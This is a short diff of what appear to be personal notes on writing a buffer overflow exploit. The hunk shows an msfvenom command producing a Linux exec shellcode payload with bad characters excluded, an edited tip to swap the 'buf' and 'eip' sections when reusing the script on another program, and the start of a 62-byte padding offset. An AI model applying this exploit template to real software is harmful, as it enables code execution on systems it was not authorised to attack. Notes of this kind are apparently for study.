@@ -406,7 +406,7 @@ msfvenom -p linux/x86/exec CMD=whoami -b "\x00\fe\x20\x0a\xff" -f python (run in
 
 
 
-what the script should look like !!!! ----> when doing this on a different program, essentailly you just change the "buf" section.
+what the script should look like !!!! ----> when doing this on a different program, essentailly you just change the "buf" section. and the eip section.
 ############################################################
 offset = "A" * 62
 
